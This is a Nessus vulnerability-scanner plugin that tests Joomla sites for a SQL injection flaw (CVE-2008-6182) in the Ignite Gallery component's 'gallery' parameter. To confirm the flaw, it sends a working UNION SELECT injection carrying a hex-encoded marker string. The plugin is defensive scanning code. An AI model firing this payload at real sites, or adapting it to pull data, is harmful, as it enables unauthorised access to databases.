#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(34420);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2008-6182");
  script_bugtraq_id(31714);
  script_xref(name:"milw0rm", value:"6723");
  script_xref(name:"Secunia", value:"32240");
  script_xref(name:"OSVDB", value:"49108");

  script_name(english:"Ignite Gallery Component for Joomla! index.php gallery Parameter SQL Injection");
  script_summary(english:"Exploits a SQL Injection Vulnerability in Ignite Gallery");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Ignite Gallery, a third-party component for
Joomla! written in PHP. 

The installed version of Ignite Gallery fails to sanitize input to the
'gallery' parameter in the 'ignitegallery.php' script before using it
in a database query.  Regardless of PHP's 'magic_quotes_gpc' setting,
an unauthenticated remote attacker can exploit this issue to
manipulate database queries, resulting in disclosure of sensitive
information or attacks against the underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://www.ignitejoomlaextensions.com/" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Ignite Gallery version 0.8.3.2 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");

if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue 
  magic = string(SCRIPT_NAME, " works!");
  exploit = "concat(";
  for (i=0; i<strlen(magic); i++)
       exploit += hex(ord(magic[i])) + ",";
     exploit[strlen(exploit)-1] = ")";
  exploit = string("-1+UNION+SELECT+1,2,", exploit, ",4,5,6,7,8,9,10+--+");

  url = string(
    dir,"/index.php?",
    "option=com_ignitegallery&",
    "task=view&",
    "gallery=", exploit
  );
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);
	
  # If we see our magic and Joomla component
  if (
    magic >< res &&
    "components/com_ignitegallery" >< res	
  )
  {
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);

    if (report_verbosity)
    {
      report = string (
        "\n",
        "Nessus was able to exploit the vulnerability using the following\n",
        "URL : \n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n",
        "\n"
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
  }
}
